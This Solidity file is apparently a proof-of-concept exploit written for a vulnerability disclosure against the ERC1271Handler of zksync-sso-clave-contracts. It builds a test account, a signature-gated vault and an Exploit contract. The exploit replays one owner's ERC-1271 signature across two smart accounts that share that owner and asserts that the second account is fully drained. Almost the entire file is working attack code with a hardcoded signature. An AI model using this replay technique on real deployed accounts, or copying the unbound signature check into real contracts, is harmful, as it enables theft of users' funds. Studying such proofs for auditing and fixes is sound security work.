// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

// REAL audited source (zksync-sso-clave-contracts @ ed21d09), byte-identical.
// Compiled inside the registry Foundry project, so these imports resolve exactly
// like the registry PoC. NO cheatcodes (no forge-std / vm.*): the in-browser EVM
// deploys `Exploit` and calls run().
// Vulnerable function: ERC1271Handler.isValidSignature (src/handlers/ERC1271Handler.sol L25).
import { ERC1271Handler } from "../src/handlers/ERC1271Handler.sol";
import { IERC1271Upgradeable } from "@openzeppelin/contracts-upgradeable/interfaces/IERC1271Upgradeable.sol";

/// @dev Concrete deployable instance of the REAL, unmodified `ERC1271Handler`
/// (real `OwnerManager` owner set). `initOwner` mirrors `SsoAccount.initialize`,
/// which itself calls `_addK1Owner(...)`. The audited replay bug lives in the
/// inherited `isValidSignature`, untouched.
contract TestSsoAccount is ERC1271Handler {
  function initOwner(address owner) external {
    _addK1Owner(owner);
  }
}

/// @dev Minimal ERC20-like unit of account: the funds each SSO account holds in
/// the vault (the asset the harm is measured in).
contract PayToken {
  string public name = "Vault USD";
  string public symbol = "vUSD";
  uint8 public decimals = 18;
  mapping(address => uint256) public balanceOf;

  function mint(address to, uint256 amount) external {
    balanceOf[to] += amount;
  }

  function transfer(address to, uint256 amount) external returns (bool) {
    require(balanceOf[msg.sender] >= amount, "insufficient");
    balanceOf[msg.sender] -= amount;
    balanceOf[to] += amount;
    return true;
  }
}

/// @dev REAL ERC-1271 consumer (the victim integration). Authorizes a payout from
/// an account's balance on a valid EIP-1271 signature over an order, and keeps its
/// OWN per-account replay guard — relying on the smart account to bind the
/// signature to (account, chain) as ERC-1271 best practice / ERC-7739 requires.
contract SignatureGatedVault {
  bytes4 internal constant MAGIC = 0x1626ba7e;
  PayToken public immutable token;
  mapping(address => uint256) public balanceOf;
  mapping(bytes32 => bool) public usedOrder;

  constructor(PayToken t) {
    token = t;
  }

  function credit(address account, uint256 amount) external {
    token.mint(address(this), amount);
    balanceOf[account] += amount;
  }

  function orderHashOf(address to, uint256 amount, uint256 nonce) public pure returns (bytes32) {
    // Binds (to, amount, nonce) but NOT the paying account — the integrator expects
    // the account's isValidSignature to bind that.
    return keccak256(abi.encode(to, amount, nonce));
  }

  function withdraw(address account, address to, uint256 amount, uint256 nonce, bytes memory signature) external {
    bytes32 orderHash = orderHashOf(to, amount, nonce);
    bytes32 key = keccak256(abi.encode(account, orderHash));
    require(!usedOrder[key], "vault: order already used on this account");
    require(IERC1271Upgradeable(account).isValidSignature(orderHash, signature) == MAGIC, "vault: bad sig");
    usedOrder[key] = true;
    balanceOf[account] -= amount;
    require(token.transfer(to, amount), "vault: transfer failed");
  }
}

/// @dev Cheatcode-free exploit. One owner EOA owns TWO SSO accounts. The owner
/// produces ONE valid EIP-1271 signature authorizing a single payment (settled from
/// account A). Because the account performs no (account, chain) binding, the SAME
/// signature is replayed against account B — draining a second account the owner
/// never scoped any authorization to.
contract Exploit {
  // Payee/attacker (the address baked into the signed order).
  address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
  // Owner EOA that controls BOTH accounts = vm.addr(0xA11CE).
  address internal constant OWNER = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;
  // 65-byte owner ECDSA signature over orderHashOf(ATTACKER, 1e18, nonce 0),
  // produced in the registry PoC (test_CrossAccountReplay_DrainsSecondAccount).
  bytes internal constant SIG =
    hex"3da1e9a4046a66bcd2fc6447475cd72c594d878dcb45889bd1669465ef8332aa0fc35246220c1ca7c46a15b8620fe0c92378bb7745445a6fa341b6f646b16d5e1b";

  uint256 internal constant AMOUNT = 1 ether;

  PayToken public token;
  SignatureGatedVault public vault;
  TestSsoAccount public accountA;
  TestSsoAccount public accountB;

  constructor() {
    token = new PayToken();
    vault = new SignatureGatedVault(token);
    accountA = new TestSsoAccount();
    accountB = new TestSsoAccount();
    accountA.initOwner(OWNER);
    accountB.initOwner(OWNER);
    // Each account holds 1e18 of vault funds.
    vault.credit(address(accountA), AMOUNT);
    vault.credit(address(accountB), AMOUNT);
  }

  function run() external {
    uint256 attackerBefore = token.balanceOf(ATTACKER);

    // (1) Authorized settlement from account A (owner intended this one payment).
    vault.withdraw(address(accountA), ATTACKER, AMOUNT, 0, SIG);

    // (2) REPLAY the identical owner signature against account B. The vault's own
    // per-account guard does not stop it, and account B validates it because it
    // shares the owner and performs no account/chain binding.
    vault.withdraw(address(accountB), ATTACKER, AMOUNT, 0, SIG);

    // HARM (asserted): account B fully drained by a signature the owner produced
    // once, for a payment never scoped to B. Attacker received 2e18 for one
    // authorization; the second 1e18 is stolen from account B.
    require(vault.balanceOf(address(accountB)) == 0, "B not drained");
    require(token.balanceOf(ATTACKER) - attackerBefore == 2 * AMOUNT, "replay did not double the payout");
  }
}
